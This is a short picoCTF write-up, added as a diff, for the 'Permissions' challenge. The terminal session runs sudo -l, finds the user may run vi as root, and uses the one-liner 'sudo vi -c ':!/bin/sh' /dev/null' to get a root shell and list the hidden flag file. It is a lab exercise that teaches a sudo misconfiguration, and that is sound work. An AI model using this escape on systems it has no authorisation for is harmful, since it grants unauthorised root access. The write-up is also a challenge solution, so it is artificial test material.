@@ -1,0 +1,44 @@
+https://play.picoctf.org/practice/challenge/363?category=5&page=1&solved=1
+
+Can you read files in the root file?
+Additional details will be available after launching your challenge instance.
+
+Hints
+What permissions do you have?
+
+
+
+picoplayer@challenge:/sys/fs/cgroup$ sudo su
+[sudo] password for picoplayer: 
+Sorry, user picoplayer is not allowed to execute '/usr/bin/su' as root on challenge.
+picoplayer@challenge:/sys/fs/cgroup$ sudo -l
+[sudo] password for picoplayer: 
+Matching Defaults entries for picoplayer on challenge:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User picoplayer may run the following commands on challenge:
+    (ALL) /usr/bin/vi
+picoplayer@challenge:/sys/fs/cgroup$ sudo vi
+picoplayer@challenge:/sys/fs/cgroup$ 
+
+
+
+sudo vi -c ':!/bin/sh' /dev/null
+
+
+# cd root
+# ls
+# ls -al
+total 16
+drwx------ 1 root root   22 Mar  9 06:14 .
+drwxr-xr-x 1 root root   63 Mar  9 06:04 ..
+-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
+-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
+-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
+-rw------- 1 root root  927 Mar  9 06:14 .viminfo
+
+
+https://medium.com/@petemuiruri/permissions-writeup-picoctf-2023-be95c95f80a5
+https://gtfobins.github.io/
+
